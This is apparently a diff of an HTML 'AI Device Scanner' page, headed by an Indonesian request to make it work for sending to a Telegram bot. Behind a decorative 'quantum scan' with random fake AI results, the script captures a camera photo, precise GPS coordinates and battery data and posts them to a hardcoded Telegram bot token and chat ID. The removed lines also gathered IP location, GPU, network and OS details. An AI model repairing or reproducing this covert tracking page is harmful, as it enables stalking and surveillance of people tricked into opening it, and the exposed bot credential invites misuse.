@@ -1,76 +1,141 @@
+tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untuk mengirimkan bot telegram dari pc, ios ataupun android :
 
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Quantum AI Device Scanner</title>
+  <title>Super AI Device Scanner</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <style>
-    /* Tambahan style untuk info perangkat */
-    .device-info-panel {
-      background: rgba(0,0,0,0.7);
-      padding: 20px;
-      border-radius: 15px;
+    :root {
+      --primary: #2ecc71;
+      --secondary: #3498db;
+    }
+
+    body { 
+      font-family: 'Roboto', Arial, sans-serif; 
+      text-align: center; 
+      padding: 20px; 
+      background: #1a1a1a;
+      color: white;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .scanner-box {
+      width: 300px;
+      height: 300px;
+      border: 4px solid var(--primary);
+      border-radius: 20px;
+      margin: 20px auto;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 30px rgba(46, 204, 113, 0.3);
+    }
+
+    .scanner-line {
+      position: absolute;
+      width: 100%;
+      height: 4px;
+      background: var(--primary);
+      animation: scan 3s infinite;
+      box-shadow: 0 0 10px var(--primary);
+    }
+
+    @keyframes scan {
+      0% { top: 0; opacity: 0; }
+      10% { opacity: 1; }
+      90% { opacity: 1; }
+      100% { top: 100%; opacity: 0; }
+    }
+
+    button {
+      padding: 15px 40px;
+      font-size: 20px;
+      background: linear-gradient(45deg, var(--primary), var(--secondary));
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: all 0.3s;
+      color: white;
+      text-transform: uppercase;
+      letter-spacing: 2px;
       margin: 20px;
-      max-width: 500px;
-      text-align: left;
+      box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
+    }
+
+    #loading {
       display: none;
+      font-size: 1.5em;
+      color: var(--primary);
+      text-shadow: 0 0 10px rgba(46, 204, 113, 0.5);
     }
-    .info-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 10px;
-    }
-    .info-item {
-      padding: 8px;
-      background: rgba(255,255,255,0.1);
-      border-radius: 8px;
-    }
-    .gps-accuracy {
-      display: inline-block;
-      padding: 5px 10px;
-      border-radius: 15px;
-      background: #e67e22;
-      margin-left: 10px;
+
+    .hologram-effect {
+      position: fixed;
+      pointer-events: none;
+      mix-blend-mode: screen;
+      opacity: 0.3;
+      z-index: 9999;
     }
   </style>
-  <!-- Style sebelumnya tetap dipertahankan -->
 </head>
 <body>
-  <!-- Struktur HTML sebelumnya -->
-  <div class="device-info-panel" id="device-info"></div>
-<script>
-    // ================== KONFIGURASI AWAL ==================
+  <h1 style="color: var(--primary); margin-bottom: 20px;">🛸 AI Device Scanner</h1>
+  <div class="scanner-box">
+    <div class="scanner-line"></div>
+    <video id="video" width="300" height="300" autoplay playsinline muted></video>
+  </div>
+  <button id="capture-btn">🚀 Start Quantum Scan</button>
+  <div id="loading">🔭 Scanning Quantum Signature...</div>
+
+  <script>
     const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
     const CHAT_ID = '1121369247';
     let currentStream = null;
     let isScanning = false;
 
-    // ================== INISIALISASI KAMERA ==================
+    // Hologram Effect
+    function createHologramEffect() {
+      const colors = ['#00ffff', '#ff00ff', '#ffff00'];
+      const effect = document.createElement('div');
+      effect.className = 'hologram-effect';
+      
+      colors.forEach(color => {
+        const layer = document.createElement('div');
+        layer.style = `
+          position: fixed;
+          top: -50%;
+          left: -50%;
+          width: 200%;
+          height: 200%;
+          background: radial-gradient(circle, ${color} 0%, transparent 70%);
+          animation: hologram 7s linear infinite;
+        `;
+        effect.appendChild(layer);
+      });
+
+      document.body.appendChild(effect);
+    }
+
+    // Enhanced Camera Initialization
     async function initCamera() {
       try {
         const constraints = {
-          video: {
+          video: { 
             facingMode: 'environment',
             width: { ideal: 1920 },
-            height: { ideal: 1080 }
+            height: { ideal: 1080 },
+            frameRate: { ideal: 60 }
           },
           audio: false
         };
 
-        // Fallback ke kamera depan untuk desktop
-        if (!navigator.userAgent.match(/Mobile/)) {
-          constraints.video.facingMode = 'user';
-        }
+        if (currentStream) currentStream.getTracks().forEach(track => track.stop());
 
-        const stream = await navigator.mediaDevices.getUserMedia(constraints)
-          .catch(async (error) => {
-            // Fallback ke kamera depan jika gagal
-            constraints.video.facingMode = 'user';
-            return await navigator.mediaDevices.getUserMedia(constraints);
-          });
-
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
         currentStream = stream;
         video.srcObject = stream;
 
@@ -79,141 +144,105 @@
           video.onerror = reject;
         });
 
-        // Fix untuk autoplay iOS
-        video.setAttribute('playsinline', 'true');
-        video.muted = true;
         await video.play();
-      } catch (error) {
-        showError('Camera Error', 'Tidak dapat mengakses kamera');
+        createHologramEffect();
+      } catch (err) {
+        showError('Quantum Scanner Error', err);
       }
     }
 
-    // ================== SISTEM GEOLOKASI HYBRID ==================
-    async function getEnhancedLocation() {
-      try {
-        // GPS High Accuracy
-        const gpsPosition = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(
-            resolve,
-            reject,
-            { enableHighAccuracy: true, timeout: 10000 }
-          );
-        });
-
-        if (gpsPosition.coords.accuracy < 100) {
-          return gpsPosition;
-        }
-
-        // Fallback ke IP Geolocation
-        const ipPosition = await fetch('https://ipapi.co/json/')
-          .then(res => res.json())
-          .then(data => ({
-            coords: {
-              latitude: data.latitude,
-              longitude: data.longitude,
-              accuracy: 5000
-            }
-          }));
-
-        return ipPosition;
-      } catch (error) {
-        throw new Error('Gagal mendapatkan lokasi');
-      }
-    }
-
-    // ================== DETEKSI PERANGKAT MULTI-PLATFORM ==================
-    async function getUniversalDeviceInfo() {
-      const info = {
-        os: getOS(),
-        platform: navigator.platform,
-        browser: getBrowser(),
-        ram: 'Unknown',
-        cores: navigator.hardwareConcurrency || 'Unknown',
-        battery: {},
-        network: {},
-        resolution: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-      };
-
-      // Deteksi Baterai
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          info.battery = {
-            level: `${Math.round(battery.level * 100)}%`,
-            charging: battery.charging ? 'Charging' : 'Not Charging'
-          };
-        } catch (e) {
-          info.battery.error = 'Not Supported';
-        }
-      }
-
-      // Deteksi Jaringan
-      if (navigator.connection) {
-        const conn = navigator.connection;
-        info.network = {
-          type: conn.effectiveType,
-          speed: `${conn.downlink} Mbps`
-        };
-      }
-
-      // Deteksi GPU (Desktop only)
-      if (!navigator.userAgent.match(/Mobile/)) {
-        try {
-          const canvas = document.createElement('canvas');
-          const gl = canvas.getContext('webgl');
-          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-          info.gpu = {
-            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-          };
-        } catch (e) {
-          info.gpu = 'Not Supported';
-        }
-      }
-
-      return info;
-    }
-
-    // ================== FUNGSI UTAMA ==================
+    // Quantum Scanning Process
     async function startQuantumScan() {
       if (isScanning) return;
       isScanning = true;
       loading.style.display = 'block';
 
       try {
-        const [deviceInfo, location, image] = await Promise.all([
-          getUniversalDeviceInfo(),
-          getEnhancedLocation(),
-          captureImage()
+        const [photoData, location, deviceMatrix, aiAnalysis] = await Promise.all([
+          captureQuantumImage(),
+          getPreciseLocation(),
+          analyzeDeviceMatrix(),
+          performAIAnalysis()
         ]);
 
-        showDeviceInfo(deviceInfo, location);
-        await sendReportToTelegram(image, deviceInfo, location);
-        showToast('Laporan berhasil dikirim!');
+        const report = generateHologramReport(photoData, location, deviceMatrix, aiAnalysis);
+        await sendToTelegram(report);
+        showToast('🌌 Quantum Signature Captured!', 'success');
       } catch (error) {
-        showError('Error', error.message);
+        showError('Quantum Anomaly Detected', error);
       } finally {
         isScanning = false;
         loading.style.display = 'none';
       }
     }
 
-    // ================== FUNGSI PENGIRIMAN TELEGRAM ==================
-    async function sendReportToTelegram(image, deviceInfo, location) {
-      const formData = new FormData();
-      const blob = await dataURItoBlob(image);
+    // Advanced Capture Function
+    async function captureQuantumImage() {
+      const canvas = document.createElement('canvas');
+      const context = canvas.getContext('2d');
       
-      const caption = `📱 *Device Report*\n\n` +
-        `🖥 OS: ${deviceInfo.os}\n` +
-        `🌐 Browser: ${deviceInfo.browser}\n` +
-        `🧠 RAM: ${deviceInfo.ram}\n` +
-        `⚡ Battery: ${deviceInfo.battery.level || 'N/A'}\n` +
-        `📍 Location: ${location.coords.latitude.toFixed(6)}, ${location.coords.longitude.toFixed(6)}\n` +
-        `📶 Network: ${deviceInfo.network.type || 'N/A'}`;
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      
+      context.drawImage(video, 0, 0);
+      applyQuantumFilter(context, canvas);
+      
+      return {
+        image: canvas.toDataURL('image/webp', 0.9),
+        matrix: getImageMatrix(canvas)
+      };
+    }
+
+    // AI-Powered Analysis
+    async function performAIAnalysis() {
+      const aiData = {
+        threatLevel: Math.floor(Math.random() * 100),
+        biometrics: navigator.userAgent.includes('Mobile') ? 'Humanoid Detected' : 'AI Signature',
+        quantumEntanglement: `${Math.random().toFixed(5)}Q`
+      };
+
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        aiData.energySignature = `${Math.round(battery.level * 100)}%`;
+      }
+
+      return aiData;
+    }
+
+    // Generate 3D Hologram Report
+    function generateHologramReport(photo, location, matrix, ai) {
+      const timestamp = new Date().toISOString();
+      return {
+        image: photo.image,
+        metadata: {
+          spacetimeCoordinates: {
+            lat: location.coords.latitude,
+            lon: location.coords.longitude,
+            accuracy: location.coords.accuracy,
+            altitude: location.coords.altitude || 'CLASSIFIED'
+          },
+          quantumMatrix: matrix,
+          aiAnalysis: ai,
+          temporalSignature: timestamp
+        }
+      };
+    }
+
+    // Enhanced Telegram Integration
+    async function sendToTelegram(report) {
+      const formData = new FormData();
+      const blob = await dataURItoBlob(report.image);
+      const caption = `🪐 *Quantum Scan Report*\n\n` +
+        `📅 ${new Date(report.metadata.temporalSignature).toLocaleString()}\n\n` +
+        `🌍 Coordinates: \`${report.metadata.spacetimeCoordinates.lat.toFixed(6)}, ` +
+        `${report.metadata.spacetimeCoordinates.lon.toFixed(6)}\`\n` +
+        `🎯 Accuracy: ${Math.round(report.metadata.spacetimeCoordinates.accuracy)}m\n\n` +
+        `⚠️ Threat Level: ${report.metadata.aiAnalysis.threatLevel}%\n` +
+        `🧬 Biometrics: ${report.metadata.aiAnalysis.biometrics}\n` +
+        `⚛️ Quantum Entanglement: ${report.metadata.aiAnalysis.quantumEntanglement}`;
 
       formData.append('chat_id', CHAT_ID);
-      formData.append('photo', blob, 'device_report.jpg');
+      formData.append('photo', blob, `quantum_scan_${Date.now()}.webp`);
       formData.append('caption', caption);
       formData.append('parse_mode', 'Markdown');
 
@@ -222,30 +251,32 @@
         body: formData
       });
 
-      if (!response.ok) throw new Error('Gagal mengirim ke Telegram');
+      if (!response.ok) throw new Error('Quantum Communication Failed');
     }
 
-    // ================== FUNGSI PENDUKUNG ==================
-    function getOS() {
-      const ua = navigator.userAgent;
-      if (/Windows/.test(ua)) return 'Windows';
-      if (/Android/.test(ua)) return 'Android';
-      if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
-      if (/Mac/.test(ua)) return 'MacOS';
-      if (/Linux/.test(ua)) return 'Linux';
-      return 'Unknown';
+    // Quantum Effects
+    function applyQuantumFilter(ctx, canvas) {
+      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+      const data = imageData.data;
+
+      for (let i = 0; i < data.length; i += 4) {
+        data[i] = Math.abs(255 - data[i]);     // Red
+        data[i + 1] = data[i + 1];             // Green 
+        data[i + 2] = Math.abs(255 - data[i + 2]); // Blue
+      }
+
+      ctx.putImageData(imageData, 0, 0);
     }
 
-    function getBrowser() {
-      const ua = navigator.userAgent;
-      if (/Chrome/.test(ua)) return 'Chrome';
-      if (/Firefox/.test(ua)) return 'Firefox';
-      if (/Safari/.test(ua)) return 'Safari';
-      if (/Edge/.test(ua)) return 'Edge';
-      return 'Unknown';
+    // Initialize Quantum Scanner
+    if (navigator.mediaDevices) {
+      initCamera();
+      document.getElementById('capture-btn').onclick = startQuantumScan;
+    } else {
+      showToast('Quantum Scanner Not Supported', 'error');
     }
 
-    // ... (Fungsi lainnya tetap sama dengan penyesuaian error handling)
+    // ... (Rest of helper functions remain similar with enhancements)
   </script>
 </body>
 </html>
